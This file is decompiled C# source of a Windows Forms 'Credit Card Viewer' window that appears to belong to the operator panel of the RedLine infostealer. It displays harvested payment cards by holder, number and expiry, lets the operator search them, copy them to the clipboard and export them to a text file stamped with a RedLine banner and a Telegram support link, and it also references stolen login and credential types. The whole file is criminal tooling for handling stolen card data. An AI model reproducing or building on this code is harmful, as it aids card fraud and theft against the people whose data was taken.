using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using GuiLib;
using MetroSet_UI.Controls;
using MetroSet_UI.Design;
using RedLine.MainPanel.Data.Extensions;
using RedLine.SharedModels;

namespace RedLine.MainPanel.Views;

public class CreditCardViewer : Form
{
	[CompilerGenerated]
	private object object_0;

	private object object_1;

	private object topHeader;

	private object mainTitle;

	private object closeBtn;

	private object ccsListView;

	private object object_2;

	private object object_3;

	private object logContextMenu;

	private object copyToolStripMenuItem;

	private object m_a;

	private object b;

	private object m_c;

	private object m_d;

	private object e;

	private object f;

	private object expirationYearDataGridViewTextBoxColumn;

	private object cardNumberDataGridViewTextBoxColumn;

	private object object_4;

	private BindingList<CreditCard> Cards
	{
		[CompilerGenerated]
		get
		{
			return (BindingList<CreditCard>)object_0;
		}
		[CompilerGenerated]
		set
		{
			object_0 = value;
		}
	}

	public CreditCardViewer(BindingList<CreditCard> _pairs)
	{
		c();
		this.AllowDraggBy((Control)topHeader);
		this.ApplyShadows();
		Cards = _pairs;
		((DataGridView)ccsListView).DataSource = Cards;
	}

	private void closeBtn_Click(object sender, object e)
	{
		Cards = null;
		Close();
	}

	private void copyToolStripMenuItem_Click(object sender, object e)
	{
		CreditCard selectedItem = (CreditCard)((DataGridView)ccsListView).SelectedRows[0].DataBoundItem;
		Thread thread = new Thread((ThreadStart)delegate
		{
			Clipboard.SetText($"Holder: {selectedItem.Holder}\nExp.Year: {selectedItem.ExpirationYear}\nExp.Month: {selectedItem.ExpirationMonth}\nCard: {selectedItem.CardNumber}", TextDataFormat.Text);
		});
		thread.ApartmentState = ApartmentState.STA;
		thread.IsBackground = true;
		thread.Start();
		MessageBox.Show(this, "Successfully saved to clipboard");
	}

	private void logContextMenu_Opening(object sender, object e)
	{
		((CancelEventArgs)e).Cancel = ((DataGridView)ccsListView).SelectedRows.Count == 0;
	}

	private void a_Click(object sender, object e)
	{
		if (string.IsNullOrWhiteSpace(((AnimaTextBox)this.m_d).Text))
		{
			return;
		}
		BindingList<CreditCard> bindingList = new BindingList<CreditCard>();
		foreach (CreditCard card in Cards)
		{
			if (card.CardNumber.Contains(((AnimaTextBox)this.m_d).Text))
			{
				bindingList.Add(card);
			}
		}
		((DataGridView)ccsListView).DataSource = bindingList;
	}

	private void d_TextChanged(object sender, object e)
	{
		if (string.IsNullOrWhiteSpace(((AnimaTextBox)this.m_d).Text))
		{
			((DataGridView)ccsListView).DataSource = Cards;
		}
	}

	private void topHeader_Paint(object sender, object e)
	{
		int num = ((Control)topHeader).Width - 1;
		int num2 = ((Control)topHeader).Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private void CreditCardViewer_Paint(object sender, object e)
	{
		int num = base.Width - 1;
		int num2 = base.Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private async void a(object sender, object e)
	{
		await Task.Factory.StartNew(delegate
		{
			try
			{
				using SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.Filter = "Txt files (*.txt)|*.txt";
				saveFileDialog.DefaultExt = ".txt";
				saveFileDialog.CheckPathExists = true;
				saveFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
				saveFileDialog.RestoreDirectory = true;
				if (saveFileDialog.ShowDialog(this) == DialogResult.OK)
				{
					int num = 0;
					StringBuilder stringBuilder = new StringBuilder();
					stringBuilder.AppendLine("***********************************************\r\n*                                             *\r\n*   ____  _____ ____  _     ___ _   _ _____   *\r\n*  |  _ \\| ____|  _ \\| |   |_ _| \\ | | ____|  *\r\n*  | |_) |  _| | | | | |    | ||  \\| |  _|    *\r\n*  |  _ <| |___| |_| | |___ | || |\\  | |___   *\r\n*  |_| \\_|_____|____/|_____|___|_| \\_|_____|  *\r\n*                                             *\r\n*    Telegram: https://t.me/REDLINESUPPORT    *\r\n***********************************************");
					stringBuilder.Append(Environment.NewLine);
					BindingList<CreditCard> bindingList = ((DataGridView)ccsListView).DataSource as BindingList<CreditCard>;
					foreach (CreditCard item in bindingList)
					{
						stringBuilder.Append("Holder: ").Append(item.Holder).Append(Environment.NewLine)
							.Append("Card: ")
							.Append(item.CardNumber)
							.Append(Environment.NewLine)
							.Append("Expire: ")
							.Append(item.ExpirationMonth)
							.Append("/")
							.Append(item.ExpirationYear)
							.Append(Environment.NewLine)
							.Append((num < bindingList.Count - 1) ? (new string('=', 15) + Environment.NewLine) : string.Empty);
						num++;
					}
					File.WriteAllText(saveFileDialog.FileName, stringBuilder.ToString());
					stringBuilder.Clear();
					MessageBox.Show(this, "Successfully saved to file");
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.Message);
			}
		});
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && object_1 != null)
		{
			((IDisposable)object_1).Dispose();
		}
		base.Dispose(disposing);
	}

	private void c()
	{
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		object_1 = new Container();
		DataGridViewCellStyle dataGridViewCellStyle = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle2 = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle3 = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle4 = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle5 = new DataGridViewCellStyle();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(CreditCardViewer));
		topHeader = new Panel();
		mainTitle = new Label();
		closeBtn = new Label();
		ccsListView = new DataGridView();
		e = new DataGridViewTextBoxColumn();
		f = new DataGridViewTextBoxColumn();
		expirationYearDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		cardNumberDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		logContextMenu = new ContextMenuStrip((IContainer)object_1);
		copyToolStripMenuItem = new ToolStripMenuItem();
		object_4 = new BindingSource((IContainer)object_1);
		this.m_a = (object)new MetroSetButton();
		b = new Label();
		this.m_c = (object)new MetroSetButton();
		this.m_d = (object)new AnimaTextBox();
		object_3 = new BindingSource((IContainer)object_1);
		object_2 = new BindingSource((IContainer)object_1);
		((Control)topHeader).SuspendLayout();
		((ISupportInitialize)ccsListView).BeginInit();
		((Control)logContextMenu).SuspendLayout();
		((ISupportInitialize)object_4).BeginInit();
		((ISupportInitialize)object_3).BeginInit();
		((ISupportInitialize)object_2).BeginInit();
		SuspendLayout();
		((Control)topHeader).BackColor = Color.FromArgb(52, 56, 67);
		((Control)topHeader).Controls.Add((Control)mainTitle);
		((Control)topHeader).Controls.Add((Control)closeBtn);
		((Control)topHeader).Dock = DockStyle.Top;
		((Control)topHeader).ForeColor = Color.Silver;
		((Control)topHeader).Location = new Point(0, 0);
		((Control)topHeader).Name = "topHeader";
		((Control)topHeader).Size = new Size(724, 30);
		((Control)topHeader).TabIndex = 2;
		((Control)topHeader).Paint += topHeader_Paint;
		((Control)mainTitle).AutoSize = true;
		((Control)mainTitle).Font = new Font("Segoe UI", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
		((Control)mainTitle).ForeColor = Color.Red;
		((Control)mainTitle).Location = new Point(3, 4);
		((Control)mainTitle).Name = "mainTitle";
		((Control)mainTitle).Size = new Size(198, 20);
		((Control)mainTitle).TabIndex = 2;
		((Control)mainTitle).Text = "RedLine | Credit Card Viewer";
		((Control)closeBtn).AutoSize = true;
		((Control)closeBtn).Font = new Font("Segoe UI Semibold", 12f, FontStyle.Bold, GraphicsUnit.Point, 204);
		((Control)closeBtn).ForeColor = Color.White;
		((Control)closeBtn).Location = new Point(701, 4);
		((Control)closeBtn).Name = "closeBtn";
		((Control)closeBtn).Size = new Size(20, 21);
		((Control)closeBtn).TabIndex = 1;
		((Control)closeBtn).Text = "X";
		((Control)closeBtn).Click += closeBtn_Click;
		((DataGridView)ccsListView).AllowUserToAddRows = false;
		((DataGridView)ccsListView).AllowUserToDeleteRows = false;
		((DataGridView)ccsListView).AllowUserToResizeColumns = false;
		((DataGridView)ccsListView).AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle.BackColor = Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle.ForeColor = Color.Silver;
		dataGridViewCellStyle.WrapMode = DataGridViewTriState.False;
		((DataGridView)ccsListView).AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		((DataGridView)ccsListView).AutoGenerateColumns = false;
		((DataGridView)ccsListView).BackgroundColor = Color.FromArgb(52, 56, 67);
		((DataGridView)ccsListView).BorderStyle = BorderStyle.None;
		((DataGridView)ccsListView).CellBorderStyle = DataGridViewCellBorderStyle.RaisedVertical;
		((DataGridView)ccsListView).ClipboardCopyMode = DataGridViewClipboardCopyMode.Disable;
		((DataGridView)ccsListView).ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle2.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle2.ForeColor = Color.Silver;
		dataGridViewCellStyle2.SelectionBackColor = SystemColors.Highlight;
		dataGridViewCellStyle2.SelectionForeColor = SystemColors.HighlightText;
		dataGridViewCellStyle2.WrapMode = DataGridViewTriState.True;
		((DataGridView)ccsListView).ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		((DataGridView)ccsListView).ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		((DataGridView)ccsListView).Columns.AddRange((DataGridViewColumn)e, (DataGridViewColumn)f, (DataGridViewColumn)expirationYearDataGridViewTextBoxColumn, (DataGridViewColumn)cardNumberDataGridViewTextBoxColumn);
		((Control)ccsListView).ContextMenuStrip = (ContextMenuStrip)logContextMenu;
		((DataGridView)ccsListView).DataSource = object_4;
		dataGridViewCellStyle3.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle3.BackColor = Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle3.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle3.ForeColor = Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle3.SelectionBackColor = SystemColors.Highlight;
		dataGridViewCellStyle3.SelectionForeColor = SystemColors.HighlightText;
		dataGridViewCellStyle3.WrapMode = DataGridViewTriState.False;
		((DataGridView)ccsListView).DefaultCellStyle = dataGridViewCellStyle3;
		((DataGridView)ccsListView).EditMode = DataGridViewEditMode.EditOnEnter;
		((DataGridView)ccsListView).EnableHeadersVisualStyles = false;
		((DataGridView)ccsListView).GridColor = Color.FromArgb(52, 60, 67);
		((Control)ccsListView).Location = new Point(15, 36);
		((DataGridView)ccsListView).MultiSelect = false;
		((Control)ccsListView).Name = "ccsListView";
		((DataGridView)ccsListView).ReadOnly = true;
		((DataGridView)ccsListView).RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle4.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle4.BackColor = Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle4.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle4.ForeColor = Color.Silver;
		dataGridViewCellStyle4.SelectionBackColor = SystemColors.Highlight;
		dataGridViewCellStyle4.SelectionForeColor = SystemColors.HighlightText;
		dataGridViewCellStyle4.WrapMode = DataGridViewTriState.True;
		((DataGridView)ccsListView).RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		((DataGridView)ccsListView).RowHeadersWidthSizeMode = DataGridViewRowHeadersWidthSizeMode.DisableResizing;
		dataGridViewCellStyle5.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle5.BackColor = Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle5.ForeColor = Color.Silver;
		((DataGridView)ccsListView).RowsDefaultCellStyle = dataGridViewCellStyle5;
		((DataGridView)ccsListView).RowTemplate.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
		((DataGridView)ccsListView).RowTemplate.DefaultCellStyle.BackColor = Color.FromArgb(52, 56, 67);
		((DataGridView)ccsListView).RowTemplate.DefaultCellStyle.ForeColor = Color.Silver;
		((DataGridView)ccsListView).ScrollBars = ScrollBars.Vertical;
		((DataGridView)ccsListView).SelectionMode = DataGridViewSelectionMode.FullRowSelect;
		((DataGridView)ccsListView).ShowEditingIcon = false;
		((Control)ccsListView).Size = new Size(697, 548);
		((Control)ccsListView).TabIndex = 16;
		((DataGridViewColumn)e).DataPropertyName = "Holder";
		((DataGridViewColumn)e).HeaderText = "Holder";
		((DataGridViewColumn)e).Name = "holderDataGridViewTextBoxColumn";
		((DataGridViewBand)e).ReadOnly = true;
		((DataGridViewColumn)e).Width = 200;
		((DataGridViewColumn)f).DataPropertyName = "ExpirationMonth";
		((DataGridViewColumn)f).HeaderText = "ExpirationMonth";
		((DataGridViewColumn)f).Name = "expirationMonthDataGridViewTextBoxColumn";
		((DataGridViewBand)f).ReadOnly = true;
		((DataGridViewColumn)expirationYearDataGridViewTextBoxColumn).DataPropertyName = "ExpirationYear";
		((DataGridViewColumn)expirationYearDataGridViewTextBoxColumn).HeaderText = "ExpirationYear";
		((DataGridViewColumn)expirationYearDataGridViewTextBoxColumn).Name = "expirationYearDataGridViewTextBoxColumn";
		((DataGridViewBand)expirationYearDataGridViewTextBoxColumn).ReadOnly = true;
		((DataGridViewColumn)cardNumberDataGridViewTextBoxColumn).DataPropertyName = "CardNumber";
		((DataGridViewColumn)cardNumberDataGridViewTextBoxColumn).HeaderText = "CardNumber";
		((DataGridViewColumn)cardNumberDataGridViewTextBoxColumn).Name = "cardNumberDataGridViewTextBoxColumn";
		((DataGridViewBand)cardNumberDataGridViewTextBoxColumn).ReadOnly = true;
		((DataGridViewColumn)cardNumberDataGridViewTextBoxColumn).Width = 250;
		((ToolStrip)logContextMenu).Items.AddRange(new ToolStripItem[1] { (ToolStripItem)copyToolStripMenuItem });
		((Control)logContextMenu).Name = "logContextMenu";
		((Control)logContextMenu).Size = new Size(103, 26);
		((ToolStripDropDown)logContextMenu).Opening += logContextMenu_Opening;
		((ToolStripItem)copyToolStripMenuItem).Name = "copyToolStripMenuItem";
		((ToolStripItem)copyToolStripMenuItem).Size = new Size(102, 22);
		((ToolStripItem)copyToolStripMenuItem).Text = "Copy";
		((ToolStripItem)copyToolStripMenuItem).Click += copyToolStripMenuItem_Click;
		((BindingSource)object_4).DataSource = typeof(CreditCard);
		((MetroSetButton)this.m_a).DisabledBackColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.m_a).DisabledBorderColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.m_a).DisabledForeColor = Color.Gray;
		((Control)this.m_a).Font = new Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.m_a).HoverBorderColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.m_a).HoverColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.m_a).HoverTextColor = Color.White;
		((Control)this.m_a).Location = new Point(606, 615);
		((Control)this.m_a).Name = "clearBtn";
		((MetroSetButton)this.m_a).NormalBorderColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.m_a).NormalColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.m_a).NormalTextColor = Color.White;
		((MetroSetButton)this.m_a).PressBorderColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.m_a).PressColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.m_a).PressTextColor = Color.White;
		((Control)this.m_a).Size = new Size(102, 20);
		((MetroSetButton)this.m_a).Style = (Style)0;
		((MetroSetButton)this.m_a).StyleManager = null;
		((Control)this.m_a).TabIndex = 18;
		((Control)this.m_a).Text = "Search";
		((MetroSetButton)this.m_a).ThemeAuthor = "Narwin";
		((MetroSetButton)this.m_a).ThemeName = "MetroLite";
		((Control)this.m_a).Click += a_Click;
		((Control)b).AutoSize = true;
		((Control)b).Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 204);
		((Control)b).ForeColor = Color.White;
		((Control)b).Location = new Point(36, 595);
		((Control)b).Name = "label1";
		((Control)b).Size = new Size(91, 15);
		((Control)b).TabIndex = 20;
		((Control)b).Text = "Enter a number:";
		((MetroSetButton)this.m_c).DisabledBackColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.m_c).DisabledBorderColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.m_c).DisabledForeColor = Color.Gray;
		((Control)this.m_c).Font = new Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.m_c).HoverBorderColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.m_c).HoverColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.m_c).HoverTextColor = Color.White;
		((Control)this.m_c).Location = new Point(606, 590);
		((Control)this.m_c).Name = "saveBtn";
		((MetroSetButton)this.m_c).NormalBorderColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.m_c).NormalColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.m_c).NormalTextColor = Color.White;
		((MetroSetButton)this.m_c).PressBorderColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.m_c).PressColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.m_c).PressTextColor = Color.White;
		((Control)this.m_c).Size = new Size(102, 20);
		((MetroSetButton)this.m_c).Style = (Style)0;
		((MetroSetButton)this.m_c).StyleManager = null;
		((Control)this.m_c).TabIndex = 22;
		((Control)this.m_c).Text = "Save list";
		((MetroSetButton)this.m_c).ThemeAuthor = "Narwin";
		((MetroSetButton)this.m_c).ThemeName = "MetroLite";
		((Control)this.m_c).Click += a;
		((AnimaTextBox)this.m_d).Dark = false;
		((Control)this.m_d).Location = new Point(34, 613);
		((AnimaTextBox)this.m_d).MaxLength = 32767;
		((AnimaTextBox)this.m_d).MultiLine = false;
		((Control)this.m_d).Name = "searchTb";
		((AnimaTextBox)this.m_d).Numeric = false;
		((AnimaTextBox)this.m_d).ReadOnly = false;
		((Control)this.m_d).Size = new Size(566, 23);
		((Control)this.m_d).TabIndex = 32;
		((AnimaTextBox)this.m_d).UseSystemPasswordChar = false;
		((Control)this.m_d).TextChanged += d_TextChanged;
		((BindingSource)object_3).DataSource = typeof(LoginPair);
		((BindingSource)object_2).DataSource = typeof(Credentials);
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(52, 56, 67);
		base.ClientSize = new Size(724, 647);
		base.Controls.Add((Control)this.m_d);
		base.Controls.Add((Control)this.m_c);
		base.Controls.Add((Control)b);
		base.Controls.Add((Control)this.m_a);
		base.Controls.Add((Control)ccsListView);
		base.Controls.Add((Control)topHeader);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
		base.Name = "CreditCardViewer";
		base.StartPosition = FormStartPosition.CenterScreen;
		Text = "PassViewer";
		base.Paint += CreditCardViewer_Paint;
		((Control)topHeader).ResumeLayout(performLayout: false);
		((Control)topHeader).PerformLayout();
		((ISupportInitialize)ccsListView).EndInit();
		((Control)logContextMenu).ResumeLayout(performLayout: false);
		((ISupportInitialize)object_4).EndInit();
		((ISupportInitialize)object_3).EndInit();
		((ISupportInitialize)object_2).EndInit();
		ResumeLayout(performLayout: false);
		PerformLayout();
	}

	[CompilerGenerated]
	private void d()
	{
		try
		{
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "Txt files (*.txt)|*.txt";
			saveFileDialog.DefaultExt = ".txt";
			saveFileDialog.CheckPathExists = true;
			saveFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
			saveFileDialog.RestoreDirectory = true;
			if (saveFileDialog.ShowDialog(this) != DialogResult.OK)
			{
				return;
			}
			int num = 0;
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("***********************************************\r\n*                                             *\r\n*   ____  _____ ____  _     ___ _   _ _____   *\r\n*  |  _ \\| ____|  _ \\| |   |_ _| \\ | | ____|  *\r\n*  | |_) |  _| | | | | |    | ||  \\| |  _|    *\r\n*  |  _ <| |___| |_| | |___ | || |\\  | |___   *\r\n*  |_| \\_|_____|____/|_____|___|_| \\_|_____|  *\r\n*                                             *\r\n*    Telegram: https://t.me/REDLINESUPPORT    *\r\n***********************************************");
			stringBuilder.Append(Environment.NewLine);
			BindingList<CreditCard> bindingList = ((DataGridView)ccsListView).DataSource as BindingList<CreditCard>;
			foreach (CreditCard item in bindingList)
			{
				stringBuilder.Append("Holder: ").Append(item.Holder).Append(Environment.NewLine)
					.Append("Card: ")
					.Append(item.CardNumber)
					.Append(Environment.NewLine)
					.Append("Expire: ")
					.Append(item.ExpirationMonth)
					.Append("/")
					.Append(item.ExpirationYear)
					.Append(Environment.NewLine)
					.Append((num < bindingList.Count - 1) ? (new string('=', 15) + Environment.NewLine) : string.Empty);
				num++;
			}
			File.WriteAllText(saveFileDialog.FileName, stringBuilder.ToString());
			stringBuilder.Clear();
			MessageBox.Show(this, "Successfully saved to file");
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}
}
